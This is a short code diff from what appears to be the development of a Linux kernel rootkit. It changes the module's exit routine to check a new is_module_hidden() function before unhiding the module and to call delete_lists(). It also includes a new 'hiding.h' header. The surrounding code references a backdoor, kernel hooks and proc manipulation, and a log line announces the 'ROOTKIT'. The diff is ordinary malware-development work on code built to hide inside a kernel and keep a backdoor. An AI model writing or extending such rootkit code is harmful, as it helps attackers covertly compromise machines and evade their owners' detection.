@@ -9,6 +9,7 @@
 #include <asm/paravirt.h> // write_cr0
 
 #include "config.h"
+#include "hiding.h"
 #include "hooks.h"
 #include "backdoor.h"
 #include "proc.h"
@@ -61,7 +62,8 @@ static void __exit lkm_exit(void){
 	proc_exit();
 	if (BACKDOOR) backdoor_exit();
 	hooks_exit();
-	if (hidden) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
+	if (is_module_hidden()) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
+	delete_lists();
 	printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
 }
 
